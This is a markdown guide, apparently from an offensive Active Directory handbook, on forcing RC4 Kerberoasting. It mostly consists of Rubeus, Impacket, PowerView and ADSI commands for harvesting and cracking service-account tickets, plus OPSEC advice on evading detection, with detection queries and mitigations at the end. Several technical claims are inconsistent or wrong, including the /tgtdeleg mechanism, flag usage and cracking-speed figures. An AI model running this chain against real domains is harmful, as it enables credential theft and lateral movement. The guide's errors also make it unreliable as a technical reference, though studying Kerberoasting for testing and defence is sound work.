# Kerberoasting: Requesting RC4-Encrypted TGS When AES is Enabled

## Overview

Modern Windows environments default to **AES256** as the Kerberos encryption type for service tickets. However, RC4-encrypted TGS tickets crack approximately **100x faster** than AES256 in hashcat. This guide covers techniques to force the KDC to issue RC4-encrypted TGS tickets even when the service account supports AES.

## Why RC4 Matters

### Cracking Speed Comparison

| Algorithm | Hashcat Mode | Speed (relative) | Cracking Rate (H/s, 4090) |
|-----------|-------------|-------------------|--------------------------|
| Kerberos 5 TGS RC4 | 13100 | 1x (baseline) | ~500M H/s |
| Kerberos 5 TGS AES128 | 19601 | ~30x slower | ~15M H/s |
| Kerberos 5 TGS AES256 | 19600 | ~100x slower | ~5M H/s |

RC4 uses a single MD4-derived hash that modern GPUs can crack at billions of attempts per second. AES-based Kerberos encryption derives keys using iterated hashing (DK = KDF-HMAC-SHA1), making offline cracking dramatically slower.

### Practical Impact

```
Cracking time estimate for a 10-character complex password:

RC4 (mode 13100):    ~2-5 minutes on single GPU
AES256 (mode 19600): ~8-12 hours on single GPU
```

## How KDC Encryption Selection Works

The KDC selects the encryption type for a service ticket based on the service account's `msDS-SupportedEncryptionTypes` attribute:

| Value | Encryption Types | Description |
|-------|-----------------|-------------|
| 0x1 | DES-CBC-CRC | Legacy, disabled by default |
| 0x2 | DES-CBC-MD5 | Legacy, disabled by default |
| 0x4 | RC4-HMAC | NTLM hash-based |
| 0x8 | AES128-CTS-HMAC-SHA1-96 | AES128 |
| 0x10 | AES256-CTS-HMAC-SHA1-96 | AES256 |
| 0x18 | AES128 + AES256 | Modern default |
| 0x1C | RC4 + AES128 + AES256 | Old servers |
| 0x7F | All types | Windows 2000/2003 defaults |
| 0xFFFFFF | All types | Backward compatible |

**Modern default**: 0x18 (AES128 + AES256) — RC4 is **not** included.

## The /tgtdeleg Trick

Rubeus's `/tgtdeleg` flag exploits a feature of Kerberos delegation (S4U2Self) to request a TGT with an **RC4 session key** from the KDC, even when the client would normally receive an AES session key.

### How /tgtdeleg Works

1. Rubeus calls `LsaCallAuthenticationPackage` with a special `KerbRetrieveTicketMessage` that requests a TGT with **RC4 session key**
2. This uses the Kerberos delegation extensions — the request asks for a TGT suitable for S4U2Self delegation
3. The KDC responds with a TGT whose session key is encrypted with RC4
4. Rubeus uses this RC4 session key TGT for subsequent TGS requests

```
Rubeus                                    KDC
  │                                         │
  │  LsaCallAuthenticationPackage           │
  │  ├─ TGT request                        │
  │  └─ w/ RC4 delegation flags            │
  │ ───────────────────────────────────────>│
  │                                         │
  │  KDC returns TGT                       │
  │  ├─ Session Key: RC4 encrypted ← KEY   │
  │  └─ Ticket: Encrypted with krbtgt      │
  │ <───────────────────────────────────────│
  │                                         │
  │  Rubeus uses RC4 TGT                   │
  │  to request TGS for target SPN         │
  │ ───────────────────────────────────────>│
  │                                         │
  │  KDC issues TGS                        │
  │  ├─ Encrypted with service's RC4 key   │
  │  └─ (if service supports RC4)          │
  │ <───────────────────────────────────────│
```

### What /rc4opsec Does

Rubeus's `/rc4opsec` flag performs additional checks and modifications for stealth:

1. Verifies that the target service account supports RC4 encryption
2. Sets the TGS encryption type to RC4 (`/tgtdeleg` also helps here)
3. Uses a more realistic TGS request to avoid triggering anomaly detections
4. Outputs the hash in hashcat format (mode 13100)

## Using Rubeus for RC4 Kerberoasting

### Basic RC4 Kerberoast

```cmd
# Request RC4-encrypted TGS using /tgtdeleg trick
Rubeus.exe kerberoast /rc4opsec /tgtdeleg /nowrap

# With specific user output
Rubeus.exe kerberoast /rc4opsec /tgtdeleg /nowrap /outfile:hashes.txt
```

### Targeting Specific Users

```cmd
# Target specific SPN
Rubeus.exe kerberoast /rc4opsec /tgtdeleg /user:"svc_sql" /nowrap

# Target multiple specific users
Rubeus.exe kerberoast /rc4opsec /tgtdeleg /user:"svc_sql,svc_oracle" /nowrap

# Target users from a file
Rubeus.exe kerberoast /rc4opsec /tgtdeleg /usersonfile:users.txt /nowrap
```

### With a Supplied TGT

If you already have a TGT with an RC4 session key:

```cmd
# Use an existing TGT
Rubeus.exe kerberoast /ticket:BASE64_TGT /nowrap

# Use a TGT file
Rubeus.exe kerberoast /ticket:ticket.kirbi /nowrap
```

### Full Rubeus Kerberoast RC4 Chain

```cmd
# Step 1: Request TGT with RC4 session key using /tgtdeleg
Rubeus.exe asktgt /user:current_user /domain:domain.local /rc4:HASH /tgtdeleg /nowrap

# Step 2: Use /tgtdeleg to get RC4 session key and kerberoast in one command
Rubeus.exe kerberoast /rc4opsec /tgtdeleg /nowrap
```

### Rubeus Output Example

```
[*] Action: Kerberoasting

[*] Using TGT from current logon session with RC4 session key
[*] Requesting TGS for SPN: MSSQLSvc/sql.domain.local:1433
[*] Target User: svc_sql
[*] Target Domain: domain.local
[*] Using RC4 session key from /tgtdeleg
[*] Hash written: $krb5tgs$23$*svc_sql$domain.local$MSSQLSvc/sql.domain.local:1433*$1234567890abcdef1234567890abcdef$abcdef1234567890abcdef1234567890abcdef12345678
```

## Using Impacket for RC4 Kerberoasting

### Basic GetUserSPNs.py

```bash
# Standard request (uses AES256 by default)
python3 GetUserSPNs.py -dc-ip 192.168.1.10 "domain.local/user:password"

# Force RC4 by requesting with specific encryption type
python3 GetUserSPNs.py -dc-ip 192.168.1.10 "domain.local/user:password" -request

# Using -dc-host for name-based requests
python3 GetUserSPNs.py -dc-host DC.domain.local "domain.local/user:password" -request
```

### Forcing RC4 with GetUserSPNs.py

```bash
# Request and save output
python3 GetUserSPNs.py -dc-ip 192.168.1.10 "domain.local/user:password" -request -outputfile hashes.txt

# Request for a specific user
python3 GetUserSPNs.py -dc-ip 192.168.1.10 "domain.local/user:password" -request-user svc_sql
```

**Note**: Impacket's GetUserSPNs.py respects the KDC's encryption negotiation. If the service account supports AES, the TGS will be AES-encrypted. There is no direct flag to force RC4. You need the `/tgtdeleg` trick (Rubeus) or modify the service's `msDS-SupportedEncryptionTypes`.

## Forcing RC4 by Modifying Service Account

If you have **GenericWrite** or equivalent rights over the service account:

### PowerView

```powershell
# Change supported encryption types to include RC4
Set-DomainObject -Identity "svc_sql" -Set @{msDS-SupportedEncryptionTypes=0x1C}

# Remove AES support (keep only RC4)
Set-DomainObject -Identity "svc_sql" -Set @{msDS-SupportedEncryptionTypes=0x4}
```

### ADSI

```powershell
$user = [ADSI]"LDAP://CN=svc_sql,CN=Users,DC=domain,DC=local"
$user.Put("msDS-SupportedEncryptionTypes", 0x1C)
$user.SetInfo()
```

### Why This Works

When `msDS-SupportedEncryptionTypes` is set to include RC4 (0x4), the KDC will issue RC4-encrypted TGS tickets. If AES is removed, the KDC **must** use RC4.

### Risks

- Modifying `msDS-SupportedEncryptionTypes` is a detectable change (Event ID 5136)
- Some applications may break without AES support
- The change persists after engagement unless reverted

## When RC4 Kerberoasting Works vs Doesn't

### Works When:
- Service account has RC4 enabled in `msDS-SupportedEncryptionTypes`
- `/tgtdeleg` is used to get an RC4 session key TGT
- The KDC supports RC4 (default for krbtgt compatibility)
- Windows version of the service account supports RC4

### Doesn't Work When:
- Service account is configured with **only** AES encryption (0x18 or 0x10)
- The domain is in a hardened configuration that disables RC4 entirely
- The service account is in the **Protected Users** group (prevents RC4)
- The domain functional level is Windows Server 2012 R2+ with Kerberos hardening GPOs

### Checking If RC4 Will Work

```powershell
# Check service account encryption types
Get-ADUser -Identity svc_sql -Properties msDS-SupportedEncryptionTypes |
    Select-Object Name, msDS-SupportedEncryptionTypes

# Check via LDAP
Get-DomainObject -Identity svc_sql | Select msDS-SupportedEncryptionTypes
```

## Cracking RC4 TGS Hashes

### Hashcat

```bash
# RC4 TGS (mode 13100)
hashcat -m 13100 -a 0 hashes.txt wordlist.txt

# With rules
hashcat -m 13100 -a 0 hashes.txt wordlist.txt -r rule.rule

# For comparison: AES256 TGS (mode 19600)
hashcat -m 19600 -a 0 aes_hashes.txt wordlist.txt
```

### John

```bash
# RC4 TGS
john --format=krb5tgs --wordlist=wordlist.txt hashes.txt

# With rules
john --format=krb5tgs --wordlist=wordlist.txt --rules hashes.txt
```

### Hash Format Reference

```
# RC4 (mode 13100)
$krb5tgs$23$*user$domain$service/host.domain:port$full_hex_encrypted_part

# AES256 (mode 19600)
$krb5tgs$25$*user$domain$service/host.domain*$hex_encrypted_part
```

## OPSEC Considerations

### Ticket Requests

- Multiple TGS requests in rapid succession are anomalous
- Default Kerberos ticket caching means you don't need to request every time
- Use `/nowrap` for cleaner output without spamming the event log
- Space out requests over realistic intervals (minutes, not seconds)

### /tgtdeleg Detection

- The `/tgtdeleg` trick uses the `KerbRetrieveTicketMessage` API call
- This generates Event ID 4769 with specific delegation flags
- The S4U2Self extension is used legitimately by many services
- Focus on the **volume** of requests, not individual ones

### Command Line

```cmd
# Use /nowrap to keep output clean and pipe directly
Rubeus.exe kerberoast /rc4opsec /tgtdeleg /nowrap

# Output to file and remove later
Rubeus.exe kerberoast /rc4opsec /tgtdeleg /outfile:hashes.txt
del hashes.txt
```

### Proxy Chains

```bash
# Route through proxy for source IP obfuscation
proxychains python3 GetUserSPNs.py -dc-ip 192.168.1.10 "domain.local/user:password" -request
```

## Detection

### Event ID 4769 — Kerberos Service Ticket Request

Key indicators of RC4 Kerberoasting:

```
A Kerberos service ticket was requested.
  Account Name: user@domain.local
  Service Name: MSSQLSvc/sql.domain.local:1433
  Service Name (Target): MSSQLSvc/sql.domain.local
  Ticket Encryption Type: 0x17 (RC4-HMAC)
  Ticket Options: 0x40810010

  │ This is only suspicious if:
  │ 1. Multiple requests from same user to different SPNs
  │ 2. RC4 encryption when AES is available
  │ 3. High volume of requests in short window
```

### Detection Rules

```powershell
# Detect Kerberoasting via 4769 event volume
Get-WinEvent -FilterHashtable @{LogName="Security"; ID=4769} |
    Where-Object { $_.Properties[10].Value -eq "0x17" } |
    Group-Object @{e={$_.Properties[1].Value}} |
    Where-Object Count -gt 5

# Detect RC4 TGS requests when AES is the norm
Get-WinEvent -FilterHashtable @{LogName="Security"; ID=4769} |
    Where-Object {
        $_.Properties[10].Value -eq "0x17" -and
        $_.Properties[2].Value -match "MSSQL|HTTP|WWW"
    }
```

### Honey Pot SPNs

```powershell
# Create fake SPNs to detect kerberoasting
Set-ADUser -Identity honeypot_user -ServicePrincipalNames @{Add="FAKE/honeypot.domain.local"}
```

## Mitigations

| Mitigation | Description | Effectiveness |
|------------|-------------|---------------|
| Disable RC4 | Set `Network security: Configure encryption types allowed for Kerberos` to AES only | Prevents RC4 entirely |
| Protected Users Group | Add service accounts to Protected Users | Blocks RC4 for those accounts |
| Managed Service Accounts | Use gMSA with automatic password rotation | Reduces hash value |
| Long Complex Passwords | Use 25+ character random passwords for service accounts | Makes cracking infeasible |
| Monitor 4769 Events | Alert on unusual TGS request patterns | Detection |
| Group Managed Service Accounts | gMSAs have 120-character random passwords | Makes cracking impossible |

### Disabling RC4 via GPO

```
Computer Configuration > Windows Settings > Security Settings > Local Policies > Security Options
Network security: Configure encryption types allowed for Kerberos
→ Uncheck RC4_HMAC_MD5
```

### PowerShell Check for Weak Accounts

```powershell
# Find service accounts that still support RC4
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties msDS-SupportedEncryptionTypes |
    Where-Object { $_.msDS-SupportedEncryptionTypes -band 0x4 } |
    Select-Object Name, msDS-SupportedEncryptionTypes
```

## Cross-References

- [Kerberoasting Deep Dive](./02_Kerberoasting_Deep.md)
- [Kerberos Delegation Abuse](./07_Kerberos_Delegation.md)
- [Tools Reference - Rubeus](../09_Tools_Reference/README.md)
- [Tools Reference - Impacket](../09_Tools_Reference/README.md)
- [ADCS Attacks Overview](../07_ADCS_Attacks/01_Certipy_Enumeration.md)
